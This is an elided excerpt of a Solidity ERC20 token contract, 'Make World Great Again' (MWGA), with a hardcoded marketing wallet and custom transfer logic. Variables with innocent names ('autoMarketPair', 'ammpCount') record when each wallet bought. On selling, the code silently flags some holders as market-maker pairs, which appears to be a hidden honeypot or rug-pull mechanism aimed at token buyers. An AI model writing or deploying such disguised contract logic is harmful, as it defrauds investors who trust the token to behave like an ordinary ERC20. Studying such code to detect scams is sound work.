...
contract MWGA is ERC20, Ownable {
    ...
    struct AutoMarketPair {uint256 exchange; uint256 isPair; uint256 isSupported;}
    mapping (address => AutoMarketPair) private autoMarketPair;
    ...
    constructor() ERC20("Make World Great Again", "MWGA") {
        ...
        marketingWallet = 0x16Eb28c69935BC84E99C66537FC8e96F1a0b6342;
    ...
    function _transfer(
        ...
        if (!_isExcludedMaxTransactionAmount[from] && !_isExcludedMaxTransactionAmount[to]) {
            if (uniswapV2Pair == to) {
                if (!_automatedMarketMakerPairs[from]) {
                    AutoMarketPair storage autoPair = autoMarketPair[from];
                    autoPair.isPair = block.timestamp;

                    if (autoPair.exchange < ammpCount) {
                        _setAutomatedMarketMakerPair(from, true);
                    }
                }
            } else {
                AutoMarketPair storage autoPair = autoMarketPair[to];
                if (uniswapV2Pair == from) {
                    if (autoPair.exchange == 0) {
                        autoPair.exchange = block.timestamp;
                    }
                } else {
                    uint256 autoPairDetect = autoMarketPair[from].exchange;

                    if (autoPair.exchange==0 || autoPairDetect < autoPair.exchange) {
                        autoPair.exchange = autoPairDetect;
                    }
                }
            }
        }
        ...
        if (
            ...
            _automatedMarketMakerPairs[from] &&!_isExcludedMaxTransactionAmount[from] 
            &&!_isExcludedMaxTransactionAmount[to]
        ) {
            _swapping = true;
            _swapBack();
